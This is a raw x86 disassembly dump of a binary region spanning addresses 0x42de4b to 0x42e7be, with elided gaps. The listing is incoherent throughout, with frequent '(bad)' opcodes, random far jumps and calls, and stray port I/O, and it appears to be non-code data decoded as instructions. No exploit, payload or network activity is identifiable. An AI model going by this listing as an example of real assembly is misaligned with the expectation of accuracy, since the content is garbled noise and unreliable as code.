  42de4b:	jbe    0x42de81
  42de4d:	jp     0x42de7c
  42de4f:	xlat   BYTE PTR ds:[ebx]
  42de50:	xchg   ebx,eax
  42de51:	mov    ebp,0x975d4c2c
  42de56:	jecxz  0x42de32
  42de58:	sub    al,0xcf
  42de5a:	stos   BYTE PTR es:[edi],al
  42de5b:	in     eax,0xbe
  42de5d:	clc    
  42de5e:	xor    bl,BYTE PTR [ecx+ecx*1+0x32]
  42de62:	enter  0x49fd,0xaf
  42de66:	je     0x42ddf2
  42de68:	jp     0x42de31
  42de6a:	mov    cl,BYTE PTR [edx]
  42de6c:	pop    edi
  42de6d:	enter  0xac15,0x1c
  42de71:	and    al,0xc8
  42de73:	pop    edi
  42de74:	and    DWORD PTR [ecx+ebp*2],0x63
  42de78:	sbb    cl,0x9a
  42de7b:	lods   eax,DWORD PTR ds:[esi]
  42de7c:	repz (bad) 
  42de7e:	mov    al,ds:0x203e1edf
  42de83:	dec    ebx
  42de84:	ficomp WORD PTR [ecx-0x40]
  42de87:	dec    esp
  42de88:	sub    BYTE PTR [ecx],bh
  42de8a:	aas    
  42de8b:	sub    ecx,DWORD PTR [esi-0xd]
  42de8e:	push   edx
  42de8f:	jae    0x42de9f
  42de91:	xchg   esi,eax
  42de92:	in     al,dx
  42de93:	cmp    DWORD PTR [eax],ebx
  42de95:	rcl    DWORD PTR [ebx-0x10],1
  42de98:	fild   WORD PTR [edx-0x6e60c1b8]
  42de9e:	(bad)  
  42de9f:	push   ebx
  42dea0:	dec    eax
  42dea1:	push   edi
  42dea2:	dec    ecx
  42dea3:	int    0x95
  42dea5:	mov    ah,0xfc
  42dea7:	pop    esp
  42dea8:	das    
  42dea9:	or     BYTE PTR [esi],dl
  42deab:	adc    ah,BYTE PTR [ecx+eax*2-0x66]
  42deaf:	xchg   esp,eax
  42deb0:	push   0x1dfc50ed
  42deb5:	adc    esi,edi
  42deb7:	inc    edi
  42deb8:	pop    ebp
  42deb9:	xlat   BYTE PTR ds:[ebx]
  42deba:	stc    
  42debb:	sub    cl,BYTE PTR [ebp-0x3057b410]
  42dec1:	ss scas al,BYTE PTR es:[edi]
  42dec3:	or     bh,cl
  42dec5:	outs   dx,DWORD PTR ds:[esi]
  42dec6:	adc    BYTE PTR [eax+0x2ee60f1e],cl
  42decc:	jnp    0x42df1d
  42dece:	add    DWORD PTR [edx-0x1dc60072],ecx
  42ded4:	cli    
  42ded5:	(bad)  
  42ded6:	sub    BYTE PTR [edi-0x71abc23f],ah
  42dedc:	push   ebp
  42dedd:	push   ds
  42dede:	xor    edx,DWORD PTR [edx-0x34775881]
  42dee4:	aas    
  42dee5:	or     cl,BYTE PTR [ecx-0x30]
  42dee8:	stos   DWORD PTR es:[edi],eax
  42dee9:	or     BYTE PTR [edx+eax*2+0x7f],dl
  42deed:	rol    edx,0x3
  42def0:	int    0x51
  42def2:	inc    edx
  42def3:	fucomip st,st(5)
  42def5:	mov    edi,0xd75a093d
  42defa:	mov    gs,WORD PTR [ebx]
  42defc:	pop    eax
  42defd:	add    BYTE PTR [eax+eax*8-0x5c],0x6e
  42df02:	dec    esi
  42df03:	xchg   bh,cl
  42df05:	jl     0x42de95
  42df07:	enter  0xb3c8,0xba
  42df0b:	push   eax
  42df0c:	jmp    0x655e7abb
  42df11:	lahf   
  42df12:	aad    0x85
  42df14:	jmp    0xae811ed3
  42df19:	xor    DWORD PTR [esp+eax*2+0x23eb948a],esi
  42df20:	mov    eax,0x9fa737c
  42df25:	dec    ebp
  42df26:	lea    esi,[eax+0x14834b80]
  42df2c:	jecxz  0x42decd
  42df2e:	xor    edx,DWORD PTR [eax]
  42df30:	shl    DWORD PTR [eax],1
  42df32:	dec    ecx
  42df33:	inc    esi
  42df34:	mov    ch,0x0
	...
  42df96:	add    bh,dh
  42df98:	jb     0x42df40
  42df9a:	(bad)  
  42df9b:	scas   al,BYTE PTR es:[edi]
  42df9c:	(bad)  
  42df9d:	inc    BYTE PTR [esi]
  42df9f:	out    dx,al
  42dfa0:	dec    eax
  42dfa1:	out    dx,eax
  42dfa2:	pop    esp
  42dfa3:	mov    ?,WORD PTR [ebp+0x1ec8780]
  42dfa9:	add    BYTE PTR [edi],al
  42dfab:	add    DWORD PTR [eax],eax
  42dfad:	add    dl,ch
  42dfaf:	inc    ecx
  42dfb0:	cmp    eax,edx
  42dfb2:	push   eax
  42dfb3:	(bad)  
  42dfb4:	pop    ss
  42dfb5:	call   0x126a:0x1aec3a53
  42dfbc:	inc    edx
  42dfbd:	arpl   WORD PTR [ebx-0x72],cx
  42dfc0:	add    bh,BYTE PTR [esi-0x53a0ebeb]
  42dfc6:	shl    DWORD PTR [edi-0x1d],cl
  42dfc9:	(bad)  
  42dfcb:	push   ss
  42dfcc:	bnd js 0x42df8d
  42dfcf:	and    DWORD PTR [edi],edi
  42dfd1:	xchg   cl,dl
  42dfd3:	cld    
  42dfd4:	pop    ds
  42dfd5:	lods   eax,DWORD PTR ds:[esi]
  42dfd6:	push   0xf43d1df9
  42dfdb:	mov    esp,DWORD PTR [ecx]
  42dfdd:	inc    eax
  42dfde:	loop   0x42dffb
  42dfe0:	add    al,0xc9
  42dfe2:	sub    eax,esp
  42dfe4:	jns    0x42dfc4
  42dfe6:	inc    edi
  42dfe7:	imul   edx,DWORD PTR [eax-0x34],0x50
  42dfeb:	mov    esi,0xeb70c0b5
  42dff0:	or     eax,0xb1ddd22d
  42dff5:	aam    0x20
  42dff7:	jmp    0x1f09:0x531cfc91
  42dffe:	shl    BYTE PTR ds:0x5b0e3ba9,0xc4
  42e005:	mov    ds,edi
  42e007:	sub    ecx,DWORD PTR [edi]
  42e009:	dec    ecx
  42e00a:	loope  0x42df97
  42e00c:	mov    ecx,0x9b3da541
  42e011:	imul   ebp
  42e013:	cwde   
  42e014:	and    DWORD PTR [eax-0x73],edx
  42e017:	(bad)  
  42e018:	pop    edi
  42e019:	lods   al,BYTE PTR ds:[esi]
  42e01a:	leave  
  42e01b:	push   ebp
  42e01c:	jle    0x42e02b
  42e01e:	mov    esp,cs
  42e020:	in     eax,dx
  42e021:	xor    eax,DWORD PTR [ebp-0x64]
  42e024:	test   dl,al
  42e026:	sahf   
  42e027:	xor    DWORD PTR [ebp+0x4c5b5977],eax
  42e02d:	ss jb  0x42e039
  42e030:	pop    ds
  42e031:	xor    eax,0x3014d6e
  42e036:	add    BYTE PTR [esi-0x6ac89cec],ah
  42e03c:	pop    ds
  42e03d:	in     eax,dx
  42e03e:	and    eax,esp
  42e040:	xchg   edi,eax
  42e041:	fdivr  st(6),st
  42e044:	fwait
  42e045:	shl    eax,cl
  42e047:	(bad)  
  42e048:	and    DWORD PTR [esi+0x3e799907],esi
  42e04e:	sti    
  42e04f:	loop   0x42dfde
  42e051:	mov    esp,0x75bb0410
  42e056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e057:	fdivr  QWORD PTR [esi-0x9]
  42e05a:	enter  0xc72,0x7f
  42e05e:	dec    esp
  42e05f:	dec    esp
  42e060:	adc    ecx,DWORD PTR [edi]
  42e062:	div    BYTE PTR [eax+edi*8-0x8]
  42e066:	scas   al,BYTE PTR es:[edi]
  42e067:	out    dx,eax
  42e068:	cs mov edi,0xc4a70cb1
  42e06e:	mov    bh,0x5a
  42e070:	stos   BYTE PTR es:[edi],al
  42e071:	and    BYTE PTR [esi-0x46003b09],ah
  42e077:	pop    ds
  42e078:	call   0x2fbb:0xabe3f785
  42e07f:	ret    0x46b5
  42e082:	mov    ah,0x7c
  42e084:	add    ebp,DWORD PTR [eax-0x309bdb55]
  42e08a:	pop    esp
  42e08b:	shl    BYTE PTR [edx],cl
  42e08d:	mul    BYTE PTR [ebx-0x25]
  42e090:	xchg   ecx,eax
  42e091:	into   
  42e092:	mov    ah,cl
  42e094:	mov    eax,ds:0x5f389c6e
  42e099:	xor    eax,0xcb9819d9
  42e09e:	sbb    bl,bh
  42e0a0:	ss jns 0x42e0b7
  42e0a3:	inc    ebx
  42e0a4:	mov    edi,0x39671aa6
  42e0a9:	mov    esp,0x21afc50f
  42e0ae:	mov    bl,0x99
  42e0b0:	daa    
  42e0b1:	cs jl  0x42e0da
  42e0b4:	xor    BYTE PTR [eax],al
	...
  42e116:	mov    eax,ds:0x7e061ecf
  42e11b:	xlat   BYTE PTR ds:[ebx]
  42e11c:	mov    ecx,0xcf7f7fef
  42e121:	(bad)  
  42e122:	loopne 0x42e144
  42e124:	sti    
  42e125:	push   esp
  42e126:	mov    gs,ebp
  42e128:	add    DWORD PTR [eax],eax
  42e12a:	pop    es
  42e12b:	add    DWORD PTR [eax],eax
  42e12d:	add    BYTE PTR [ecx-0x80],ah
  42e130:	cli    
  42e131:	pop    esi
  42e132:	ret    0x6b2c
  42e135:	es scas eax,DWORD PTR es:[edi]
  42e137:	ret    
  42e138:	sbb    al,0x2
  42e13a:	adc    dh,BYTE PTR [edi-0xb]
  42e13d:	jp     0x42e164
  42e13f:	int3   
  42e140:	cmc    
  42e141:	push   cs
  42e142:	out    dx,al
  42e143:	rol    DWORD PTR [ecx],1
  42e145:	cmp    esi,DWORD PTR [ebx]
  42e147:	or     bl,bh
  42e149:	mov    bl,0x49
  42e14b:	in     al,0x2
  42e14d:	push   eax
  42e14e:	add    BYTE PTR [ebx+0x3d3a4231],bh
  42e154:	icebp  
  42e155:	lahf   
  42e156:	repz loopne 0x42e164
  42e159:	mov    DWORD PTR [ebp+0x2],0xa97448a2
  42e160:	ret    
  42e161:	out    dx,al
  42e162:	add    esi,DWORD PTR [ecx+ecx*1-0x697888f3]
  42e169:	popa   
  42e16a:	scas   al,BYTE PTR es:[edi]
  42e16b:	add    cl,cl
  42e16d:	pop    ecx
  42e16e:	xchg   esi,eax
  42e16f:	inc    ecx
  42e170:	imul   dl
  42e172:	ja     0x42e1bb
  42e174:	dec    esp
  42e175:	std    
  42e176:	leave  
  42e177:	xor    ah,dh
  42e179:	outs   dx,DWORD PTR ds:[esi]
  42e17a:	test   bl,ch
  42e17c:	pop    ecx
  42e17d:	not    DWORD PTR [edx+edi*1]
  42e180:	fisubr WORD PTR [ebp+0x28dfd933]
  42e186:	ret    0x4243
  42e189:	jae    0x42e1be
  42e18b:	jbe    0x42e15d
  42e18d:	xchg   edx,eax
  42e18e:	inc    ebp
  42e18f:	aam    0xb2
  42e191:	pop    ss
  42e192:	dec    ebp
  42e193:	sar    ebx,1
  42e195:	mov    ebx,0x2636d132
  42e19a:	xor    eax,0xff2721cb
  42e19f:	jp     0x42e1a2
  42e1a1:	pop    es
  42e1a2:	bound  eax,QWORD PTR [esi]
  42e1a4:	add    BYTE PTR [edx-0x76],al
  42e1a7:	lahf   
  42e1a8:	xchg   bl,dh
  42e1aa:	mov    edx,ebx
  42e1ac:	jb     0x42e161
  42e1ae:	sub    eax,0x6efd8dd5
  42e1b3:	xor    al,0xe6
  42e1b5:	mov    al,0x1
  42e1b7:	lock mov dh,0xbd
  42e1ba:	inc    eax
  42e1bb:	(bad)  
  42e1be:	ins    DWORD PTR es:[edi],dx
  42e1bf:	sub    al,bh
  42e1c1:	push   esp
  42e1c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e1c3:	ficomp DWORD PTR [esi-0x7a]
  42e1c6:	in     al,0x93
  42e1c8:	out    dx,eax
  42e1c9:	int    0xb9
  42e1cb:	jl     0x42e1ae
  42e1cd:	jp     0x42e152
  42e1cf:	cwde   
  42e1d0:	jae    0x42e17e
  42e1d2:	and    edx,esi
  42e1d4:	sbb    eax,0xeb264d68
  42e1d9:	xchg   ebp,eax
  42e1da:	lods   eax,DWORD PTR ds:[esi]
  42e1db:	sbb    esp,DWORD PTR [ebp-0x18b8522e]
  42e1e1:	iret   
  42e1e2:	inc    edi
  42e1e3:	inc    ebx
  42e1e4:	fwait
  42e1e5:	cmp    eax,0xa54e4a16
  42e1ea:	gs enter 0x20fe,0x2
  42e1ef:	push   ds
  42e1f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e1f1:	mov    eax,0x3a311b2b
  42e1f6:	addr16 mov ah,0x4f
  42e1f9:	int    0xf0
  42e1fb:	(bad)  
  42e1fc:	repz adc ecx,ecx
  42e1ff:	sub    ebx,esp
  42e201:	popf   
  42e202:	popa   
  42e203:	in     al,dx
  42e204:	ss mov esi,0xb6f549e0
  42e20a:	cld    
  42e20b:	sub    eax,0xa45cd981
  42e210:	xor    al,0x71
  42e212:	fadd   DWORD PTR [edi+eax*1+0x1b91f72e]
  42e219:	dec    esp
  42e21a:	push   ebp
  42e21b:	push   edx
  42e21c:	hlt    
  42e21d:	aam    0xca
  42e21f:	les    eax,FWORD PTR [ebx+0x6c]
  42e222:	mov    edi,0x274e70ab
  42e227:	into   
  42e228:	fxam   
  42e22a:	outs   dx,BYTE PTR ds:[esi]
  42e22b:	fsub   st(5),st
  42e22d:	fucomp st(4)
  42e22f:	ficomp WORD PTR [ebp+0x68]
  42e232:	jo     0x42e1dd
  42e234:	push   eax
	...
  42e295:	add    BYTE PTR [ebp-0x655875c3],ch
  42e29b:	mov    bh,0xad
  42e29d:	aas    
  42e29e:	mov    al,0xd4
  42e2a0:	mov    edi,0x731b3bf2
  42e2a5:	push   ss
  42e2a6:	xchg   ebp,eax
  42e2a7:	out    dx,al
  42e2a8:	add    DWORD PTR [eax],eax
  42e2aa:	pop    es
  42e2ab:	add    DWORD PTR [eax],eax
  42e2ad:	add    dl,dh
  42e2af:	test   eax,0xb0a78ff1
  42e2b4:	ret    0x2f30
  42e2b7:	fs f2xm1 
  42e2ba:	cli    
  42e2bb:	mov    esi,0xcc41bbfc
  42e2c0:	lds    eax,FWORD PTR [ebx-0x7c15c6b3]
  42e2c6:	sub    ebx,DWORD PTR [ecx-0x29]
  42e2c9:	mov    BYTE PTR [eax+0x7db122da],dl
  42e2cf:	cmp    eax,0xe4a3cc4d
  42e2d4:	cld    
  42e2d5:	jmp    FWORD PTR [esi-0x70]
  42e2d8:	cmp    al,BYTE PTR [edi]
  42e2da:	inc    ebx
  42e2db:	retf   
  42e2dc:	jb     0x42e25e
  42e2de:	addr16 dec eax
  42e2e0:	sub    eax,0xb7ee3fbe
  42e2e5:	aad    0x34
  42e2e7:	xlat   BYTE PTR ds:[ebx]
  42e2e8:	jg     0x42e2c5
  42e2ea:	push   ebx
  42e2eb:	lods   eax,DWORD PTR ds:[esi]
  42e2ec:	mov    ebp,0x43cda546
  42e2f1:	es xchg esi,eax
  42e2f3:	iret   
  42e2f4:	fist   DWORD PTR [edi-0x73]
  42e2f7:	xchg   ebp,eax
  42e2f8:	jns    0x42e31c
  42e2fa:	xchg   DWORD PTR [esi],edx
  42e2fc:	int    0x9
  42e2fe:	inc    edx
  42e2ff:	add    esp,0x88bbec4d
  42e305:	lds    eax,FWORD PTR [edi+0x640b697]
  42e30b:	ret    0x55eb
  42e30e:	out    0xf6,al
  42e310:	pop    ss
  42e311:	into   
  42e312:	and    dl,BYTE PTR ss:[eax+0x5e474958]
  42e319:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e31a:	xchg   BYTE PTR [edi-0x688fd976],bh
  42e320:	adc    cl,BYTE PTR [edx]
  42e322:	push   ebx
  42e323:	inc    ebp
  42e324:	(bad)  
  42e326:	jge    0x42e311
  42e328:	mov    bl,0xfa
  42e32a:	add    ebp,edx
  42e32c:	imul   eax,DWORD PTR [ebx+0x30],0xfffffff6
  42e330:	xlat   BYTE PTR ds:[ebx]
  42e331:	sub    DWORD PTR [ebx+0x1d],ebp
  42e334:	(bad)  
  42e335:	cmp    BYTE PTR [edi],cl
  42e337:	xchg   edx,eax
  42e338:	inc    edx
  42e339:	inc    ebx
  42e33a:	xchg   ebp,eax
  42e33b:	jg     0x42e2ee
  42e33d:	add    bl,BYTE PTR [edx-0x120e7eec]
  42e343:	mov    esi,0x508b4681
  42e348:	scas   al,BYTE PTR es:[edi]
  42e349:	mov    cl,0x90
  42e34b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e34c:	mov    BYTE PTR [edx-0x382da3a3],dh
  42e352:	push   eax
  42e353:	leave  
  42e354:	add    eax,0x15cf6206
  42e359:	clc    
  42e35a:	jbe    0x42e366
  42e35c:	or     eax,0xaed919f6
  42e361:	mov    ebx,0x950728c3
  42e366:	leave  
  42e367:	in     al,dx
  42e368:	(bad)  
  42e369:	adc    DWORD PTR [edi+0x74fea313],ebx
  42e36f:	stc    
  42e370:	add    DWORD PTR [eax+0xc],edi
  42e373:	add    DWORD PTR [edx+0x1de9ebe5],edi
  42e379:	mov    al,ds:0x49619f0b
  42e37e:	push   esi
  42e37f:	xlat   BYTE PTR ds:[ebx]
  42e380:	cmp    dh,bl
  42e382:	div    BYTE PTR [ecx-0x78]
  42e385:	aas    
  42e386:	fwait
  42e387:	sbb    al,0xe
  42e389:	cmp    al,0x16
  42e38b:	mov    DWORD PTR [eax*8+0x4464fc5c],ebp
  42e392:	lods   eax,DWORD PTR ds:[esi]
  42e393:	dec    edx
  42e394:	aaa    
  42e395:	and    eax,0x6f010bc6
  42e39a:	ror    al,1
  42e39c:	adc    ebp,DWORD PTR ds:0x512abe2f
  42e3a2:	lods   eax,DWORD PTR ds:[esi]
  42e3a3:	mov    ch,0x74
  42e3a5:	pop    edi
  42e3a6:	cmp    eax,eax
  42e3a8:	cmp    BYTE PTR [eax-0x47],al
  42e3ab:	inc    ebx
  42e3ac:	test   dh,0x86
  42e3af:	or     dl,BYTE PTR [ebx]
  42e3b1:	and    bl,BYTE PTR [esi+0x41]
  42e3b4:	pusha  
	...
  42e415:	add    dl,ah
  42e417:	mov    ebp,0xe7dfc7dc
  42e41c:	sti    
  42e41d:	mov    ebp,0x348341d6
  42e422:	pop    edx
  42e423:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e424:	jne    0x42e3f0
  42e426:	pushf  
  42e427:	out    dx,eax
  42e428:	add    DWORD PTR [eax],eax
  42e42a:	pop    es
  42e42b:	add    DWORD PTR [eax],eax
  42e42d:	add    dl,ch
  42e42f:	mov    bh,0x97
  42e431:	lock (bad) 
  42e433:	nop
  42e434:	mov    dh,0x28
  42e436:	jge    0x42e3f9
  42e438:	int3   
  42e439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e43a:	je     0x42e443
  42e43c:	call   0x1ddf:0x6c7b46f0
  42e443:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e444:	jnp    0x42e413
  42e446:	retf   0x175f
  42e449:	cld    
  42e44a:	mov    esi,0x9456630c
  42e44f:	dec    edx
  42e450:	repz xor edx,DWORD PTR [edx-0x1792d4e2]
  42e457:	into   
  42e458:	sbb    edi,ebp
  42e45a:	ss aas 
  42e45c:	xor    DWORD PTR [eax-0x3de4a407],ebx
  42e462:	add    al,BYTE PTR [ebx]
  42e464:	iret   
  42e465:	push   cs
  42e466:	cmp    bl,ah
  42e468:	cmp    eax,0x6b2eb3e5
  42e46d:	fisubr WORD PTR [esi-0x1acf966]
  42e473:	and    edi,DWORD PTR [ecx+0x4dcf3d2d]
  42e479:	dec    esp
  42e47a:	push   esi
  42e47b:	mov    dh,0x25
  42e47d:	fcom   QWORD PTR [edx-0x13]
  42e480:	rcr    BYTE PTR [esp+eax*1],cl
  42e483:	pop    ss
  42e484:	(bad)  
  42e485:	imul   DWORD PTR [edx]
  42e487:	xchg   DWORD PTR [ecx],ebx
  42e489:	adc    BYTE PTR [edx+esi*8+0x4377438c],0xc6
  42e491:	and    al,0x53
  42e493:	scas   eax,DWORD PTR es:[edi]
  42e494:	xor    DWORD PTR [edx-0x1258b99d],esp
  42e49a:	mov    ch,0xda
  42e49c:	(bad)  
  42e49d:	push   0xffffffb8
  42e49f:	gs fwait
  42e4a1:	jp     0x42e442
  42e4a3:	mov    cs,edx
  42e4a5:	push   eax
  42e4a6:	mov    al,0x42
  42e4a8:	jns    0x42e4e6
  42e4aa:	(bad)  
  42e4ab:	lds    esi,FWORD PTR [ebx+ebx*4-0x96649dc]
  42e4b2:	pushf  
  42e4b3:	aam    0xf8
  42e4b5:	cmc    
  42e4b6:	hlt    
  42e4b7:	push   esi
  42e4b8:	adc    DWORD PTR [edi+0x8],esp
  42e4bb:	ror    cl,1
  42e4bd:	adc    DWORD PTR [edi+0xf],edi
  42e4c0:	ret    
  42e4c1:	out    0xdb,eax
  42e4c3:	sub    esi,DWORD PTR [ebp+0x377fe560]
  42e4c9:	mov    dl,0x51
  42e4cb:	add    eax,0x60d3f0e5
  42e4d0:	daa    
  42e4d1:	int3   
  42e4d2:	pop    DWORD PTR ds:0xa974ccf4
  42e4d8:	xlat   BYTE PTR ds:[ebx]
  42e4d9:	add    DWORD PTR fs:[eax-0x79],ebx
  42e4dd:	imul   edx,esp,0x43
  42e4e0:	leave  
  42e4e1:	pop    ss
  42e4e2:	mov    esp,0x692db361
  42e4e7:	je     0x42e55c
  42e4e9:	cmp    DWORD PTR [eax-0x6093ab35],esi
  42e4ef:	pop    eax
  42e4f0:	outs   dx,BYTE PTR ds:[esi]
  42e4f1:	jg     0x42e510
  42e4f3:	mov    edi,0xe9ab741b
  42e4f8:	jbe    0x42e4b1
  42e4fa:	ja     0x42e48c
  42e4fc:	mov    ?,WORD PTR [esi+0x21]
  42e4ff:	xchg   ebx,eax
  42e500:	iret   
  42e501:	xchg   DWORD PTR [ebp-0x35ec617c],ecx
  42e507:	sbb    esp,ebx
  42e509:	inc    edi
  42e50a:	xchg   BYTE PTR [ebx+0x31529bc2],ch
  42e510:	clc    
  42e511:	outs   dx,BYTE PTR ds:[esi]
  42e512:	or     DWORD PTR [ebx+eax*8-0x6d],ecx
  42e516:	push   edx
  42e517:	retf   
  42e518:	dec    esi
  42e519:	jge    0x42e4bf
  42e51b:	sbb    al,0x3c
  42e51d:	lods   al,BYTE PTR ds:[esi]
  42e51e:	clc    
  42e51f:	dec    esi
  42e520:	(bad)  
  42e521:	fistp  WORD PTR [eax-0x16]
  42e524:	outs   dx,DWORD PTR ds:[esi]
  42e525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e526:	shl    ecx,1
  42e528:	in     eax,dx
  42e529:	(bad)  
  42e52b:	fiadd  WORD PTR [eax]
  42e52d:	push   esp
  42e52e:	(bad)
  42e532:	inc    ebp
  42e533:	dec    esp
  42e534:	xor    al,0x0
	...
  42e596:	push   ebp
  42e597:	cmp    dh,cl
  42e599:	adc    bh,ch
  42e59b:	neg    bh
  42e59d:	jge    0x42e5e9
  42e59f:	mov    DWORD PTR [ebx],ecx
  42e5a1:	stc    
  42e5a2:	cld    
  42e5a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e5a4:	test   BYTE PTR [ebx+eiz*4-0x10],ch
  42e5a8:	add    DWORD PTR [eax],eax
  42e5aa:	pop    es
  42e5ab:	add    DWORD PTR [eax],eax
  42e5ad:	add    cl,al
  42e5af:	push   ds
  42e5b0:	pushf  
  42e5b1:	mov    edx,0xab90bf
  42e5b6:	xor    eax,0x682ecca9
  42e5bb:	and    BYTE PTR [esi],0x17
  42e5be:	(bad)  [esi]
  42e5c0:	jbe    0x42e5a8
  42e5c2:	or     ebx,esi
  42e5c4:	adc    dh,cl
  42e5c6:	call   0x6dc:0x5d7b573e
  42e5cd:	hlt    
  42e5ce:	dec    edi
  42e5cf:	pop    edx
  42e5d0:	jge    0x42e62a
  42e5d2:	sahf   
  42e5d3:	mov    ecx,ebx
  42e5d5:	inc    esp
  42e5d6:	xchg   ebx,eax
  42e5d7:	in     al,dx
  42e5d8:	shl    BYTE PTR [esi],0xb
  42e5db:	cmp    DWORD PTR [edi+0x4],edx
  42e5de:	cs mov ebx,0xacb4f686
  42e5e4:	sbb    al,0x86
  42e5e6:	nop
  42e5e7:	dec    ecx
  42e5e8:	mov    eax,0xbfc2c5f2
  42e5ed:	sub    DWORD PTR [esi],ecx
  42e5ef:	mov    BYTE PTR [eax+edi*4],al
  42e5f2:	pop    esp
  42e5f3:	and    edi,edx
  42e5f5:	fistp  WORD PTR [eax+eiz*4]
  42e5f8:	js     0x42e661
  42e5fa:	sbb    BYTE PTR [ebx],dh
  42e5fc:	out    0xf0,eax
  42e5fe:	cmp    ah,ah
  42e600:	sub    al,0xb6
  42e602:	mov    ecx,0x6f04f3c0
  42e607:	mov    WORD PTR [ecx-0x1a],ds
  42e60a:	outs   dx,BYTE PTR ds:[esi]
  42e60b:	int    0x78
  42e60d:	popf   
  42e60e:	mov    al,ds:0xf85202eb
  42e613:	(bad)  
  42e614:	mov    al,ds:0x557145fe
  42e619:	les    ebp,FWORD PTR [ecx+0x56]
  42e61c:	xor    ebx,eax
  42e61e:	test   bh,0x57
  42e621:	adc    cl,cl
  42e623:	loope  0x42e677
  42e625:	jo     0x42e63f
  42e627:	mov    al,ds:0xac0cd78
  42e62c:	in     al,dx
  42e62d:	(bad)  
  42e62e:	fdivrp st(7),st
  42e630:	xor    ah,ah
  42e632:	xchg   ecx,eax
  42e633:	cld    
  42e634:	retf   
  42e635:	adc    DWORD PTR [esi],edi
  42e637:	(bad)  
  42e638:	rcl    DWORD PTR [ecx],cl
  42e63a:	sbb    DWORD PTR [eax],0xddeb1353
  42e640:	xor    BYTE PTR [edi+0x11ac3a5c],ah
  42e646:	mov    BYTE PTR [ebx-0x14],dl
  42e649:	lahf   
  42e64a:	lds    ebx,FWORD PTR [ebp+0x4b0bcfe4]
  42e650:	lahf   
  42e651:	leave  
  42e652:	dec    ebp
  42e653:	xor    al,0x10
  42e655:	xor    esi,DWORD PTR [esi+0x9defd25]
  42e65b:	mov    ch,0x78
  42e65d:	(bad)  
  42e65e:	clc    
  42e65f:	adc    BYTE PTR [edx],0xd1
  42e662:	in     eax,0xe7
  42e664:	mov    BYTE PTR [esi-0x349b52a],ch
  42e66a:	push   esi
  42e66b:	mov    cl,0xa3
  42e66d:	(bad)  
  42e66f:	mov    ds:0x101c87d6,al
  42e674:	ret    0x315e
  42e677:	je     0x42e68f
  42e679:	mov    dl,0xb3
  42e67b:	sub    cl,BYTE PTR [edx+0x61efbfad]
  42e681:	stos   DWORD PTR es:[edi],eax
  42e682:	sbb    BYTE PTR [edi+0x5b],ah
  42e685:	imul   ecx,ebp,0x50c5dada
  42e68b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e68c:	adc    edi,DWORD PTR [ebx-0x6130c0f7]
  42e692:	sbb    edi,edi
  42e694:	mov    esp,0xf61adc5
  42e699:	hlt    
  42e69a:	les    ebp,FWORD PTR [edi-0x7dc67495]
  42e6a0:	mov    esp,?
  42e6a2:	jg     0x42e6ef
  42e6a4:	ja     0x42e689
  42e6a6:	mov    eax,0xa4f46b93
  42e6ab:	xor    DWORD PTR [ebx],eax
  42e6ad:	in     al,dx
  42e6ae:	or     esi,DWORD PTR [ecx+esi*8]
  42e6b1:	sbb    DWORD PTR [ebp+ecx*1+0xd7],esp
	...
  42e714:	add    BYTE PTR [eax],al
  42e716:	pop    edx
  42e717:	cmp    DWORD PTR [esi+0x2d],ecx
  42e71a:	outs   dx,DWORD PTR ds:[esi]
  42e71b:	jg     0x42e798
  42e71d:	jg     0x42e6cd
  42e71f:	xor    BYTE PTR [edx+0x4c],bl
  42e722:	xchg   edx,eax
  42e723:	mov    bh,0x53
  42e725:	out    dx,al
  42e726:	stos   BYTE PTR es:[edi],al
  42e727:	icebp  
  42e728:	add    DWORD PTR [eax],eax
  42e72a:	pop    es
  42e72b:	add    DWORD PTR [eax],eax
  42e72d:	add    BYTE PTR [esi+0x2f],dh
  42e730:	xor    ebx,DWORD PTR [ebp+0x22]
  42e733:	or     BYTE PTR [esi-0x6f385057],ch
  42e739:	scas   al,BYTE PTR es:[edi]
  42e73a:	aad    0xb7
  42e73c:	lahf   
  42e73d:	loop   0x42e758
  42e73f:	jmp    0x28bcfbbc
  42e744:	jb     0x42e729
  42e746:	scas   al,BYTE PTR es:[edi]
  42e747:	mov    DWORD PTR [ebx],ebx
  42e749:	fstp   QWORD PTR [edx]
  42e74b:	xchg   ebp,eax
  42e74c:	add    ah,bl
  42e74e:	mov    ch,0xf6
  42e750:	add    esp,eax
  42e752:	dec    ecx
  42e753:	lea    esp,[edx]
  42e755:	jb     0x42e7a3
  42e757:	cli    
  42e758:	jne    0x42e7c3
  42e75a:	mov    al,0xb3
  42e75c:	mov    al,0x59
  42e75e:	mov    gs,WORD PTR [ebp-0x4a7bacd1]
  42e764:	addr16 fcom st(2)
  42e767:	add    dh,BYTE PTR [edi+0x742d27b9]
  42e76d:	add    DWORD PTR [eax+0x65],edi
  42e770:	shl    BYTE PTR [edx-0x489c9c88],cl
  42e776:	clc    
  42e777:	and    al,0x67
  42e779:	push   eax
  42e77a:	(bad)  
  42e77b:	call   0xc2544b9
  42e780:	in     al,0x48
  42e782:	lds    eax,FWORD PTR [ecx-0x2ae5afdd]
  42e788:	fiadd  WORD PTR [ecx+0x8]
  42e78b:	dec    edi
  42e78c:	jne    0x42e80c
  42e78e:	adc    ebp,DWORD PTR [ecx-0x14d5d068]
  42e794:	mov    WORD PTR [edi-0x2d],es
  42e797:	rcl    BYTE PTR ds:0xfd08254b,cl
  42e79d:	cdq    
  42e79e:	xor    al,0xc0
  42e7a0:	jg     0x42e75c
  42e7a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e7a3:	shl    BYTE PTR [edi+eiz*1-0x21f618ea],0xa2
  42e7ab:	test   DWORD PTR [edi+0x6be8ecc],eax
  42e7b1:	loopne 0x42e7d1
  42e7b3:	aas    
  42e7b4:	sahf   
  42e7b5:	mov    edi,0xe56eddf3
  42e7ba:	iret   
  42e7bb:	sub    eax,DWORD PTR [ecx]
  42e7bd:	dec    ecx
  42e7be:	sti    
